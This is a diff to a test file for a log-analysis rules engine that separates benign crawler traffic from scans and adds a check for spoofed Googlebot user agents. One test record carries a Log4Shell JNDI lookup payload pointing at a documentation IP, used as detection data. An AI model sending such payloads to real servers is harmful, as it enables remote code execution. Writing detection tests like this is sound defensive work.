@@ -1,7 +1,7 @@
 """Rules for real public-server traffic: nginx access lines and sshd (synthetic lines, documentation IPs)."""
 
 from app.netlogs import enrich, parse_http, parse_sshd
-from app.rules import RulesEngine
+from app.rules import BotCheck, RulesEngine
 
 T0 = 1_790_000_000.0
 
@@ -39,8 +39,12 @@ def test_cms_paths_only_count_when_missing():
     assert r.check(nginx(2, "192.0.2.10", "/wp-admin/", 200), T0).category == "benign"  # a real WordPress site
 
 
+def _fake_dns(ip):
+    return ("crawl-192-0-2-20.googlebot.com", {"192.0.2.20"}) if ip == "192.0.2.20" else ("", set())
+
+
 def test_harmless_404s_and_crawlers_do_not_make_a_scan():
-    r = RulesEngine()
+    r = RulesEngine(good_bot=BotCheck(lookup=_fake_dns))
     for i in range(20):
         assert r.check(nginx(i, "192.0.2.20", f"/old-page-{i}", 404, ua="Mozilla/5.0 (compatible; Googlebot/2.1)"), T0 + i).category == "benign"
         assert r.check(nginx(100 + i, "192.0.2.21", "/favicon.ico", 404), T0 + i).category == "benign"
@@ -178,3 +182,10 @@ def test_collector_parsed_fields_are_used_first():
            "parsed": {"format": "nginx_access", "kind": "http_request", "method": "GET", "path": "/", "status": 200,
                       "query": "x=${jndi:ldap://198.51.100.99/a}", "user_agent": "Mozilla/5.0", "malformed_request": False}}
     assert r.check(web, T0).category == "port_scan"
+
+
+def test_a_fake_googlebot_still_makes_a_scan():
+    r = RulesEngine(scan_4xx_count=10, scan_window_s=120, good_bot=BotCheck(lookup=_fake_dns))
+    hits = [r.check(nginx(i, "198.51.100.7", f"/old-page-{i}", 404, ua="Mozilla/5.0 (compatible; Googlebot/2.1)"),
+                    T0 + i).category for i in range(10)]
+    assert hits[-1] == "port_scan"
